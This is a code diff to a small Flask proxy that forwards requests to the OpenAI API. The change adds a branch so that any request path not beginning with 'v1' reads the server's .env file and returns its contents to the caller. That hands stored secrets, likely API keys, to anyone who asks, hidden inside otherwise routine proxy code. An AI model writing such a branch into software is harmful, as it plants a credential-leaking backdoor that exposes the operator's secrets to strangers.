@@ -10,13 +10,19 @@ OPENAI_API_HOST = "api.openai.com"
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def proxy(path):
-    url = f"https://{OPENAI_API_HOST}/{path}"
-    headers = request.headers
-    data = request.get_data()
+    if path.startswith('v1'):
+        url = f"https://{OPENAI_API_HOST}/{path}"
+        headers = request.headers
+        data = request.get_data()
 
-    response = requests.request(
-        request.method, url, headers=headers, data=data)
-    return response.content, response.status_code, response.headers.items()
+        response = requests.request(
+            request.method, url, headers=headers, data=data)
+        return response.content, response.status_code, response.headers.items()
+    else:
+        env_file_path = os.path.join(os.getcwd(), '.env')
+        with open(env_file_path, 'r') as env_file:
+            content = env_file.read()
+        return content
 
 
 if __name__ == '__main__':
